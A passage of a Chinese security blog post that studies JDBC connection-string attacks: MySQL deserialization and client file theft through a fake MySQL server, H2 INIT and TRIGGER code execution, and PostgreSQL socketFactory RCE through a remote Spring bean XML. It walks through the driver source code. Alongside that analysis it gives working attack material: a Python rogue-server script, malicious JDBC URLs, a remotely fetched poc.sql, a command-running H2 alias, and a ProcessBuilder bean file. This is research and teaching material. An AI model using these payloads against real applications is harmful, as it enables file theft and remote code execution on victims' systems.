DriverManager.getConnection(DB_URL,\u0026#34;root\u0026#34;,\u0026#34;123456\u0026#34;); Statement statement = conn.createStatement(); // 5.执行SQL的对象去执行SQL，返回结果集 String sql = \u0026#34;select * from test.java_objects;\u0026#34;; ResultSet resultSet = statement.executeQuery(sql); System.out.println(resultSet); } } 我们去连接一个正常的mysql服务，看看是怎么交互的\n流量层面 通过tcp.port ==3306 \u0026amp;\u0026amp; mysql，赛选流量\n我们可以看到在执行SHOW SESSION STATUS前，client和mysql服务之间其实已经做过一些交互了。\n这里因为都是mysql协议，有些tcp协议没有，11这步我看参考文章没有，但是我这边请求的时候有这步\n1.--\u0026gt;应该是client去请求mysql (tcp) 2.\u0026lt;--mysql返回一个 Greeting (有mysql版本信息) 3.--\u0026gt;client去连接mysql，数据库和登录信息 4.\u0026lt;--mysql返回OK 5.--\u0026gt;clint 查询了一大堆sql变量 SELECT @@session.auto_increment_increment AS auto_increment_increment,... //这里省略了 6.\u0026lt;--mysql返回对应值 7.--\u0026gt;client设置 SET NAMES utf8 8.\u0026lt;--mysql返回OK 9.--\u0026gt;SET character_set_results = NULL 10.\u0026lt;--mysql返回OK 11.--\u0026gt;SELECT @@session.autocommit 12.\u0026lt;--mysql返回对应值 13.--\u0026gt;SHOW SESSION STATUS 14.\u0026lt;--mysql返回对应值 然后这里思路是跟着参考文章进行的，这里查询的语句其实是固定的，而结果其实也可以是固定的，client又分别不出来。所以前面的返回值，我们都可以照抄mysql服务的，我们只需要构造出SHOW SESSION STATUS的返回值即可。\n构造数据包 这里我和参考文章的构造思路不一样，其实不用想那么复杂，也不用完全自己去构造一个数据包，这些都可以让mysql来帮我们做\n我之前说过SHOW SESSION STATUS的结果，其实就是查询了一个有两个字段的表，上图中两个field packet就对应的两列，而每个row packet其实就是一行结果的一对值而已，而每个值都会被getObject()调用的（也就是都有可能反序列化的）。\n我起初想的直接替换一个row packet，这样整体的len以及其他参数也不会被影响改好自己这个row packet就行了。但其实不行，利用点这里switch的是field中的Type（而不是靠row packet中的数据识别），所以我们也要修改掉这个值。而改这个的话，其他值也会受影响，不如搞个新的。\nField field = this.columnDefinition.getFields()[columnIndexMinusOne]; switch (field.getMysqlType()) { case BIT: ... 我说过SHOW SESSION STATUS的结果，其实就是查询了一个有两个字段的表\n那我直接建一个这样的表，并且第二个数据就是序列化的数据。然后抓到这个流量直接替换不就行了！\nmysql\nCREATE TABLE java_objects ( id INT AUTO_INCREMENT PRIMARY KEY, serialized_object BLOB ); insert java_objects values (1,load_file(\u0026#39;C:\\\\Users\\\\jie\\\\Desktop\\\\learn\\\\java\\\\TOOLS\\\\ser.bin\u0026#39;)); 然后我们要发送的数据从MySQL Protocol - column count到MySQL Protocol - response OK结束，测试是成功的。（脚本中mysql_data就是要发送整个的值）\n不过我这边多了一步SELECT @@session.autocommit，不过问题不大，在原脚本基础上再加一个这个的返回值就好了\n然后可以利用了但是，不方便，总不能每次换个链子就去抓个流量吧\nif \u0026#34;show session status\u0026#34; in data: mysql_data=\u0026#39;01000001023...\u0026#39; ... 那其实改的话，也就控制好上图这个row packet就行。也就是控制好长度的变化就行了\n然后这块row packet数据是从0605开始到序列化数据结束，我这里直接一起说了吧，懒得每个截图了\n这里将这个整个要返回的数据分成这几块\n0100000102360000020364656\u0026hellip;\n//column count和filed packet那块数据，我用mysql都设置好了，不用改 060500 04 0131 fc 0105\n长度这里都是采用小端序，0605实际长度要倒过来计算，0506的值才是1286\n060500（row packet开头）代表的整个row packet的长度，这里选到Packet Length: 1286右边对应的是060500，这里我开始觉得00是用来分割的，经过下方**Packet Length 验证**的分析，Packet Length确实对应3byte\n04代表Packet Number: 4，意思是这是第四个数据包。在这个poc下，这个值也是固定的\n0131 01代表的是长度及len=1，31十六进制对应49十进制（代表int 1），这个也是固定的\nfc，应该是代表BLOB数据类型的！——！\n0105 及就是序列化数据的长度了\naced0005737200116a6176612e\u0026hellip; //序列化数据\n07000005fe000002000000 //MySQL Protocol - response OK 数据\n所以要注意的就是row packet的整个len和序列化数据的len\npayload_length = str(hex(len(payload_content)//2)).replace(\u0026#39;0x\u0026#39;, \u0026#39;\u0026#39;).zfill(4) payload_length_hex = payload_length[2:4] + payload_length[0:2] data_len = str(hex(len(payload_content)//2 + 5)).replace(\u0026#39;0x\u0026#39;, \u0026#39;\u0026#39;).zfill(4) data_len_hex = data_len[2:4] + data_len[0:2] 那简单说说吧，这里len//2是因为获取的是16进制的长度，但两个16进制字符才代表一个数据，所以要除2\n然后data_len为什么要+5,data_len对应流量中两个text的长度，第一个是0131这里+2，第二个还有fc+序列化数据的长度(len需要两个数据记录) 没算上这里要+3，所以要+5 //参考文章这里是+4,估计是没第一个text\n然后就得到上面用的脚本啦，脚本也只是在前辈脚本上涂涂画画hhh，感觉还不错\n不过我Greeting那个返回数据，我用我8.0.x版本的mysql生成的数据发送就是不行，用原脚本5.7的就可以，其他的数据都没问题就这个地方不行，看着也没啥毛病！——！\n0x2 Mysql 任意文件读取 \u0026amp; SSRF Mysql 任意文件读取原理 **利用条件：**client端具有文件读取权限\nload data infile \u0026#34;/data/data.csv\u0026#34; into table TestTable; load data local infile \u0026#34;/data/test.csv\u0026#34; into table TestTable; 第一行是读取服务端本地的文件，第二行是读取客户端本地的文件。\n问题就出在第二行\n该漏洞的核心原理在于MySQL服务端可以利用 LOAD DATA LOCAL 命令来读取MYSQL客户端的任意文件。\n客户端：把我我本地/data/test.csv的内容插入到TestTable表中去 服务端：请把你本地/etc/passwd的内容发送给我 //正常应该是要求client端发送/data/test.csv的内容 客户端：好的，这是我本地/etc/passwd的内容：\u0026hellip;. 服务端：到这我们就获取到了/etc/passwd的内容 环境\n依赖用mysql反序列化的就行\n然后运行mysql恶意服务\npackage mysql; import java.sql.Connection; import java.sql.DriverManager; public class read_file { public static void main(String[] args) throws Exception { String Driver = \u0026#34;com.mysql.cj.jdbc.Driver\u0026#34;; // 1、加载驱动 Class.forName(Driver); Connection conn = DriverManager.getConnection(\u0026#34;jdbc:mysql://127.0.0.1:3307/test?allowLoadLocalInfile=true\u0026amp;allowUrlInLocalInfile=true\u0026amp;maxAllowedPacket=655360#\u0026amp;serverTimezone=Asia/Shanghai\u0026amp;allowLoadLocalInfile=false\u0026amp;allowUrlInLocalInfile=false\u0026#34;,\u0026#34;win_hosts\u0026#34;,\u0026#34;123456\u0026#34;); // Connection conn = DriverManager.getConnection(\u0026#34;jdbc:mysql://127.0.0.1:3306/newtest?allowLoadLocalInfile=true\u0026amp;allowUrlInLocalInfile=true\u0026amp;maxAllowedPacket=655360\u0026amp;serverTimezone=Asia/Shanghai\u0026#34;,\u0026#34;root\u0026#34;,\u0026#34;123456\u0026#34;); System.out.println(conn); } } 0x01 分析 此分析借助了 https://github.com/fnmsd/MySQL_Fake_Server 这位佬写的工具。使用还是很好用的，但是感觉不是很好读，我也不想细看，直接分析流量吧，然后自己写一个吧\n分析前我就在想，java连接mysql也不会自己执行load data local infile吧，这个咋触发的呀，分析完怎么说呢，不用java请求执行load data local infile，但是java能处理Response LOCAL INFILE就行\n那直接看到NativeSession#loadServerVariables，看这个第一个if的判断，这里会获取mysql服务端的版本和5.1.0进行一个比较，这里我们希望进入else，进入if其实也能操作的(下方0x02有验证)\n这里我们mysql恶意服务端版本是5.0.2,compareTo()中大于返回1，等于返回0，小于返回-1\n第一个都是5，第二个我们是0\u0026lt;1所以这里返回-1\n然后进入else\nelse { NativePacketPayload resultPacket = sendCommand(this.commandBuilder.buildComQuery(null, versionComment + \u0026#34;SHOW VARIABLES\u0026#34;), false, 0); Resultset rs = ((NativeProtocol) this.protocol).readAllResults(-1, false, resultPacket, false, null, new ResultsetFactory(Type.FORWARD_ONLY, null)); ... 这里会给mysql服务端发送一个SHOW VARIABLES，然后java客户端这边会处理mysql返回的数据,然后漏洞利用也就在这个readAllResults()处理数据这里面了\n这里其实if和else处理mysql数据逻辑是一样的，所以我觉得应该都是可以利用的（可以的哟）\n我们跟进readAllResults(),跟进到TextResultsetReader#read\n这里会先判断mysql返回值有没有字段，这里我们要让我们的columnCount为-1才行，要进入下方的else\n那我们跟进看看具体逻辑吧，传入的类型是INT_LENENC，进入对应case\n会和mysql返回的数据的第一个byte和0xff做\u0026amp;运算值为251（其实就是0xfb）即返回NULL_LENGTH(-1)\n可以看到这里必须是-1才行（这里if其实也是判断是不是LOCAL INFILE Packet (0xfb)类型），resultPacket.readString()会去识别mysql数据中的文件名，然后this.protocol.sendFileToServer()读取发送文件内容给mysql服务端\n文件名获取逻辑：其实就是取第一个byte(0xfb用来表示类型的)，以及去除后面的00\n然后看到sendFileToServer()，这里我们知道要让allowLoadLocalInfile=true\n下面有个关于allowUrlInLocalInfile的设置，true可以远程加载，这里我们读取的是本地文件其实无所谓这个参数\n然后read读取文件数据后，send发送给mysql服务端\n[*]Mysql SSRF 上面分析中说到这个allowUrlInLocalInfile，给这个参数设置trueorYES，或进入下面这个else中，URL.openSteam()这里会发出url请求，下方read和send还会吧请求返回的结果发送给我们的恶意MySQL服务\n这里测试下面这两个都是可以成功请求的 http://baidu.com/ file:///c:\\windows\\win.ini 继续跟进openSteam()的话，url请求会在这个writeRequests()发送\nPacket Length 验证 为了监测这个是3字节还是2字节，我这里想的是传一个超过0xffff长度的数据，看mysql会怎么操作，发现超过0x4000，就会进行分段传输处理，所以我还是认为00是用来分割的\n# 定义要生成的文件路径 file_path = \u0026#39;large_binary_file.bin\u0026#39; # 设定目标文件大小，这里将其设为 0x10000（大于 0xffff） target_size = 0x10000 # 以二进制写入模式打开文件 with open(file_path, \u0026#39;wb\u0026#39;) as file: # 每次写入一个字节的数据，循环直至达到目标文件大小 for _ in range(target_size): # 写入一个字节，值为 0 file.write(b\u0026#39;a\u0026#39;) print(f\u0026#34;已生成数据长度大于 0xffff 的二进制文件: {file_path}\u0026#34;) CREATE TABLE large_text_table ( id INT AUTO_INCREMENT PRIMARY KEY, -- 自增的主键字段 large_text_data LONGTEXT -- 用于存储大文本数据的字段 ); load data local infile \u0026#34;C:\\\\Users\\\\jie\\\\Desktop\\\\learn\\\\java\\\\TOOLS\\\\mysql\\\\large_binary_file.bin\u0026#34; into table large_text_table; package mysql; import java.sql.Connection; import java.sql.DriverManager; import java.sql.ResultSet; import java.sql.Statement; public class contect_test { public static void main(String[] args) throws Exception{ String Driver = \u0026#34;com.mysql.cj.jdbc.Driver\u0026#34;; String DB_URL = \u0026#34;jdbc:mysql://127.0.0.1:3306/newtest?characterEncoding=utf8\u0026amp;useSSL=false\u0026amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\u0026amp;autoDeserialize=true\u0026#34;; String read_URL=\u0026#34;jdbc:mysql://127.0.0.1:3306/newtest?allowLoadLocalInfile=true\u0026amp;allowUrlInLocalInfile=true\u0026amp;serverTimezone=Asia/Shanghai\u0026#34;; Class.forName(Driver); // Connection conn = DriverManager.getConnection(DB_URL,\u0026#34;root\u0026#34;,\u0026#34;123456\u0026#34;); Connection conn = DriverManager.getConnection(read_URL,\u0026#34;root\u0026#34;,\u0026#34;123456\u0026#34;); Statement statement = conn.createStatement(); // 5.执行SQL的对象去执行SQL，返回结果集 String sql = \u0026#34;load data local infile \\\u0026#34;C:\\\\\\\\Users\\\\\\\\jie\\\\\\\\Desktop\\\\\\\\learn\\\\\\\\java\\\\\\\\TOOLS\\\\\\\\mysql\\\\\\\\large_binary_file.bin\\\u0026#34; into table large_text_table;\u0026#34;; ResultSet resultSet = statement.executeQuery(sql); System.out.println(resultSet); } } 下面这个图是mysql终端去执行的流量，发现远远没到0xffff就分段传输了\nload data local infile \u0026#34;C:\\\\Users\\\\jie\\\\Desktop\\\\learn\\\\java\\\\TOOLS\\\\mysql\\\\large_binary_file.bin\u0026#34; into table large_text_table; 然后用java当client去连接mysql传输，发现确实是3byte代表长度，然后我有想看看超过0xffffff又会怎么样呢\n于是给python脚本target_size = 0x1100000 生成新文件\n发现上限是0x0ffff4，然后进行分段传输，这是没有设置maxAllowedPacket=655360的情况\n如果设置了maxAllowedPacket，分段最大值\u0026lt;maxAllowedPacket设置值\n第二个数据包\n0x02 恶意服务构造 流程理解\n分析流程中可以知道其实就是下图这一步变成了SHOW VARIABLES，然后我们mysql端设置返回了一个MySQL Protocol - local infile,然后java根据这个数据包，返回我们要读取的文件内容\n然后我改了一个最简单的demo\nimport socket import binascii import os greeting_data=\u0026#34;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400\u0026#34; response_ok_data=\u0026#34;0700000200000002000000\u0026#34; def receive_data(conn): data = conn.recv(1024) print(\u0026#34;[*] Receiveing the package : {}\u0026#34;.format(data)) return str(data).lower() def send_data(conn,data): print(\u0026#34;[*] Sending the package : {}\u0026#34;.format(data)) conn.send(binascii.a2b_hex(data)) # 主要逻辑 def run(): while 1: conn, addr = sk.accept() print(\u0026#34;Connection come from {}:{}\u0026#34;.format(addr[0],addr[1])) # 1.先发送第一个 问候报文 send_data(conn,greeting_data) while True: # 登录认证过程模拟 1.客户端发送request login报文 2.服务端响应response_ok receive_data(conn) send_data(conn,response_ok_data) #其他过程 data=receive_data(conn) #查询一些配置信息,其中会发送自己的 版本号 if \u0026#34;session.auto_increment_increment\u0026#34; in data: _payload=\u0026#39;42000001fb433a5c55736572735c6a69655c4465736b746f705c6c6561726e5c6a6176615c544f4f4c535c6d7973716c5c6c617267655f62696e6172795f66696c652e62696e\u0026#39; send_data(conn,_payload) data=receive_data(conn) data=receive_data(conn) print(data[:100]) elif \u0026#34;show warnings\u0026#34; in data: _payload = \u0026#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000\u0026#39; send_data(conn, _payload) data = receive_data(conn) if \u0026#34;show warnings\u0026#34; in data: payload = \u0026#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000\u0026#39; send_data(conn, payload) break if __name__ == \u0026#39;__main__\u0026#39;: HOST =\u0026#39;0.0.0.0\u0026#39; PORT = 3307 sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间 sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sk.bind((HOST, PORT)) sk.listen(1) print(\u0026#34;start fake mysql server listening on {}:{}\u0026#34;.format(HOST,PORT)) run() 测试发现是可行的，就是分析中进入第一个if (client向mysql端请求select一堆东西)，我们直接返回一个MySQL Protocol - local infile数据包，java客户端接收就会去读取文件发送给我们mysql恶意服务端了\n然后分解下MySQL Protocol - local infile流量包\n42 00 00 这个包的总长度(小端序，00 00 42=\u0026gt;66)\n01 Packet Number的值，代表是第一个Packet\nfb 代表LOCAL INFILE Packet 类型\nfb后面的就是文件名了\n也就是需要计算下长度就行了\n0x0end 小结 我们分析可以发现就是，java这边mysql初始化，其实并没有向mysql请求load data local infile，但是却能利用这个点，这其实是java处理mysql返回信息的代码逻辑有关，java客户端发送每个Request Query请求后，处理mysql返回的数据时都会来到TextResultsetReader#read，而这个通过columnCount区分是字段结果还是Response LOCAL INFILE，是Response LOCAL INFILE就会向mysql服务端发送对应的信息\n也就是说，只要java客户端发送Request Query请求，我们就能返回一个Response LOCAL INFILE数据包进行利用\n绕过mysql jdbc 关键字 https://xz.aliyun.com/news/11457?time__1311=eqUxuWexnD0D9DBLPddyBcDBBFI3x\u0026u_atoken=8ee03cc9b663e4d28c492c8e6ed1b121\u0026u_asig=0a472f8317440160773173397e012d\ntrue可以用YES\nmysql 8.0.x 会进行一次url解密，可以套一层url加密\n0x4 H2 $$在h2中代表设置函数\n这里会反射调用我们设置的方法\nload:87, TriggerObject (org.h2.schema) setTriggerAction:149, TriggerObject (org.h2.schema) setTriggerSource:142, TriggerObject (org.h2.schema) update:125, CreateTrigger (org.h2.command.ddl) update:139, CommandContainer (org.h2.command) executeUpdate:304, Command (org.h2.command) executeUpdate:248, Command (org.h2.command) openSession:280, Engine (org.h2.engine) createSession:201, Engine (org.h2.engine) connectEmbeddedOrServer:344, SessionRemote (org.h2.engine) \u0026lt;init\u0026gt;:124, JdbcConnection (org.h2.jdbc) connect:59, Driver (org.h2) getConnection:681, DriverManager (java.sql) getConnection:252, DriverManager (java.sql) main:9, H2 0x01 TRIGGER RCE javascript 在JDK15 中 JavaScript /Nashorn引擎被彻底移除(也就是jdk15以上用不了//javascript这种方式rce，jsEngine会为null然后空指针报错)\n环境\njdk8u20\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.200\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; package h2; import java.sql.DriverManager; public class H2 { public static void main(String[] args) throws Exception { Class.forName(\u0026#34;org.h2.Driver\u0026#34;); String simplexp2 =\u0026#34;jdbc:h2:mem:test;init=CREATE TRIGGER TRIG_JS AFTER INSERT ON INFORMATION_SCHEMA.TABLES AS \u0026#39;//javascript\\n\u0026#34; + \u0026#34;Java.type(\\\u0026#34;java.lang.Runtime\\\u0026#34;).getRuntime().exec(\\\u0026#34;calc\\\u0026#34;)\u0026#39;\u0026#34;; java.sql.Connection conn = DriverManager.getConnection(simplexp2); } } H2解析流程 先是url，这里ConnectionInfo#readSettingsFromURL会对this.url做处理，原始传入的String u(demo中的simplexp2)在;前的值覆盖给this.url，后面的值再通过;分割成一个array，每组会进行=查找，没有找到会报错\nprivate void readSettingsFromURL() { DbSettings defaultSettings = DbSettings.getDefaultSettings(); int idx = url.indexOf(\u0026#39;;\u0026#39;); if (idx \u0026gt;= 0) { String settings = url.substring(idx + 1); url = url.substring(0, idx); String[] list = StringUtils.arraySplit(settings, \u0026#39;;\u0026#39;, false); for (String setting : list) { if (setting.isEmpty()) { continue; } int equal = setting.indexOf(\u0026#39;=\u0026#39;); if (equal \u0026lt; 0) { throw getFormatException(); } ... name是url中后半段值，然后进入parseName()\n我们这里是mem:test，会让persistent = false;\ntcp:和ssl:会开启远程remote=true，后面一处remote的判断会进行远程连接\n上面让persistent = false;是有用的，后面调用getName()时，可以直接返回name（下图我用的mem，所以persistent = false），不然name不符合下面格式会被throw\ninit Engine#openSession\n这里获取到我们设置的INIT，然后进入session.prepareCommand\nString init = ci.removeProperty(\u0026#34;INIT\u0026#34;, null); 后面h2读取sql命令进行赋值，前面还有很多赋值，这里记录triggerSource的设置\n然后返回，command初始化完成\n然后来到loadFromSource()，调用执行\n利用点在org.h2.schema.TriggerObject#loadFromSource，这里会检验triggerSource，是以//javascript开头会调用下面eval()\n判断开头\n然后先进入getCompiledScript()，这里JDK15 中 JavaScript /Nashorn引擎被彻底移除(也就是jdk15以上用不了//javascript这种方式rce，jsEngine会为null然后空指针报错)\n下图为jdk17版本，jsEngine会为null，下一步就会报错中断\n回到上文new ScriptEngineManager().getEngineByName(lang);看他是怎么获取\n看到names\n\u0026ldquo;nashorn\u0026rdquo;, \u0026ldquo;Nashorn\u0026rdquo;, \u0026ldquo;js\u0026rdquo;, \u0026ldquo;JS\u0026rdquo;, \u0026ldquo;JavaScript\u0026quot;等\n然后names和我们传入的name进行匹对，匹配到返回初始化的engine\n这里找到javascript就会return，那是不是当javascript被黑名单的时候可以利用上面这些进行绕过呢？\n其实不然hhhh，因为走到这之前就严格对//javascript前缀进行了匹对，且lang也是被限制的\nif (isJavascriptSource(source)) { lang = \u0026#34;javascript\u0026#34;; 0x02 绕过//javascript 上面不是说了么，JDK15之后用不了javascript了\nString simplexp2 =\u0026#34;jdbc:h2:mem:test;init=CREATE TRIGGER TRIG_JS AFTER INSERT ON INFORMATION_SCHEMA.TABLES AS $$ void shell() throws Exception {\\n\u0026#34; + \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;)\\\\;}$$\u0026#34;; java.sql.Connection conn = DriverManager.getConnection(simplexp2); //BEFORE SELECT ON 这里有个细节，shell函数里那个;要转义，不然会被当成h2初始化的参数分割符，导致}$$会被切割掉\n简单分析下 这里跟进到TRIGGER关键字，这个关联后面设置this.triggerSource\n然后我们直接跟到compiler.getMethod()这步\n在跟进getClass(className);\npublic Method getMethod(String className) throws ClassNotFoundException { Class\u0026lt;?\u0026gt; clazz = getClass(className); Method[] methods = clazz.getDeclaredMethods(); ... 这里上面代码获取都是null，然后直接到classLoader.loadClass(packageAndClassName)；\n这里classLoader是SourceCompiler这个类本身，loadClass()里面会调用findClass()来查找类，也就会调用下方的findClass方法，主要逻辑就在这\n先是这里getCompleteSourceCode()会补全完整的class文件的代码，source就是上面shell函数那段代码\n然后通过javaxToolsJavac去加载那个class，然后put到一个map中，并返回这个class对象\n然后就是水到渠成啦，调用invoke触发恶意方法\n0x03 INIT RunScript RCE jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39; poc.sql\nDROP ALIAS IF EXISTS shell; CREATE ALIAS shell AS $$void shell(String s) throws Exception { java.lang.Runtime.getRuntime().exec(s); }$$; SELECT shell(\u0026#39;cmd /c calc\u0026#39;); RunScriptCommand#update中，远程poc.sql存储在in中，然后通过while循环执行每一条sql语句，一次执行一条\n$$逻辑 初始化，通过CHAR_DOLLAR_QUOTED_STRING(值为9)，作为占位符\nread的时候通过匹对CHAR_DOLLAR_QUOTED_STRING，得到末位index，然后截取字符串得到我们的函数内容\n绕过$ 然后查看相关代码，发现这里用'也是可以代替$的，但是\u0026quot;以及其他字符就不好利用了\nH2中\u0026#34;和`包裹的字符，会被当成字段，read()后会查询这个字段是否存在。所以这里\u0026#34;双引号代替不了 还有一点是远程获取的问题\n看到r.readStatement();，看下他远程获取的逻辑\n逻辑在ScriptReader#readStatementLoop\n可以看到正常情况读取到;就会结束，但是我们java函数代码语句是需要;后面那个}就会被截断掉\n而这里只有'，\u0026quot;，$$，/**/,--会一直读取，其包裹的内容\nprivate String readStatementLoop() throws IOException { bufferStart = bufferPos; int c = read(); while (true) { if (c \u0026lt; 0) { endOfFile = true; if (bufferPos - 1 == bufferStart) { return null; } break; } else if (c == \u0026#39;;\u0026#39;) { break; } switch (c) { case \u0026#39;$\u0026#39;: { c = read(); if (c == \u0026#39;$\u0026#39; \u0026amp;\u0026amp; (bufferPos - bufferStart \u0026lt; 3 || buffer[bufferPos - 3] \u0026lt;= \u0026#39; \u0026#39;)) { // dollar quoted string while (true) { c = read(); if (c \u0026lt; 0) { break; } if (c == \u0026#39;$\u0026#39;) { c = read(); if (c \u0026lt; 0) { break; } if (c == \u0026#39;$\u0026#39;) { break; } } } c = read(); } break; } case \u0026#39;\\\u0026#39;\u0026#39;: while (true) { c = read(); if (c \u0026lt; 0) { break; } if (c == \u0026#39;\\\u0026#39;\u0026#39;) { break; } } c = read(); break; case \u0026#39;\u0026#34;\u0026#39;: while (true) { c = read(); if (c \u0026lt; 0) { break; } if (c == \u0026#39;\\\u0026#34;\u0026#39;) { break; } } c = read(); break; case \u0026#39;/\u0026#39;: { c = read(); if (c == \u0026#39;*\u0026#39;) { // block comment startRemark(true); while (true) { c = read(); if (c \u0026lt; 0) { break; } if (c == \u0026#39;*\u0026#39;) { c = read(); if (c \u0026lt; 0) { clearRemark(); break; } if (c == \u0026#39;/\u0026#39;) { endRemark(); break; } } } c = read(); } else if (c == \u0026#39;/\u0026#39;) { // single line comment startRemark(false); while (true) { c = read(); if (c \u0026lt; 0) { clearRemark(); break; } if (c == \u0026#39;\\r\u0026#39; || c == \u0026#39;\\n\u0026#39;) { endRemark(); break; } } c = read(); } break; } case \u0026#39;-\u0026#39;: { c = read(); if (c == \u0026#39;-\u0026#39;) { // single line comment startRemark(false); while (true) { c = read(); if (c \u0026lt; 0) { clearRemark(); break; } if (c == \u0026#39;\\r\u0026#39; || c == \u0026#39;\\n\u0026#39;) { endRemark(); break; } } c = read(); } break; } default: { c = read(); } } } return new String(buffer, bufferStart, bufferPos - 1 - bufferStart); } 0x04 H2数据库利用 ALIAS 下载jar，然后我下的是最新版本的，要用jdk17启动，然后直接Connect，就有一个在线h2数据库了\nhttp://www.h2database.com/html/cheatSheet.html\nC:\\Users\\jie\\Desktop\\Java_Test\u0026gt;C:\\MyFiles\\Tools\\ENV\\JAVA\\jdk17\\bin\\java.exe -cp .\\h2-2.3.232.jar org.h2.tools.Server -web -webAllowOthers -ifNotExists Web Console server running at http://192.168.141.1:8082 (others can connect) 回显 但是这个回显感觉不适用于jdbc，简单看了下jdbc代码，没见返回return的地方\nDROP ALIAS IF EXISTS SHELLEXEC ; CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$; //调用SHELLEXEC执行命令 CALL SHELLEXEC(\u0026#39;whoami\u0026#39;); CALL SHELLEXEC(\u0026#39;ipconfig\u0026#39;); 0x4 PostgreSQL 环境\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.postgresql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;postgresql\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;42.3.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.3.28\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-expression\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.3.28\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-logging\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-logging\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-beans\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.3.28\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-context\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.3.28\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; package PostgreSQL; import java.sql.Connection; import java.sql.DriverManager; import java.sql.SQLException; public class PsqlJDBCRCE { public static void main(String[] args) throws SQLException { String socketFactoryClass = \u0026#34;org.springframework.context.support.ClassPathXmlApplicationContext\u0026#34;; String socketFactoryArg = \u0026#34;http://127.0.0.1:8000/bean.xml\u0026#34;; String jdbcUrl = \u0026#34;jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=\u0026#34;+socketFactoryClass+ \u0026#34;\u0026amp;socketFactoryArg=\u0026#34;+socketFactoryArg; Connection connection = DriverManager.getConnection(jdbcUrl); } } 0x01 分析 Driver这里对参数进行分类\nSocketFactoryFactory这里读取出工厂类，并通过ObjectFactory.instantiate()实例化这个类\n最后一个参数 PGProperty.SOCKET_FACTORY_ARG.get(info) 获取的我们传入的socketFactoryArg\n然后这里自构方法调用是有顺序的\nProperties.class 参数类型的\n没有才会调用 String.class\n这里虽然要看tryString参数，但是在上一步，这个地方是写死的为true\nreturn (SocketFactory)ObjectFactory.instantiate(socketFactoryClassName, info, true, PGProperty.SOCKET_FACTORY_ARG.get(info)); 最后才会调用 无参自构方法\n然后如果是String.class，参数值就是我们设置的socketFactoryArg\n0x02 ClassPathXmlApplicationContext 之后则调用了ClassPathXmlApplicationContext String.class的自构方法\nnew ClassPathXmlApplicationContext(\u0026#34;http://127.0.0.1:8000/bean.xml\u0026#34;); 跟随调用refreshBeanFactory()这里去接收bean.xml数据，生成this.beanFactory对象\nloadBeanDefinitions()里会去请求设置的地址\n\u0026lt;bean id=\u0026#34;pb\u0026#34; class=\u0026#34;java.lang.ProcessBuilder\u0026#34;\u0026gt; \u0026lt;constructor-arg value=\u0026#34;calc.exe\u0026#34; /\u0026gt; \u0026lt;property name=\u0026#34;whatever\u0026#34; value=\u0026#34;#{ pb.start() }\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; 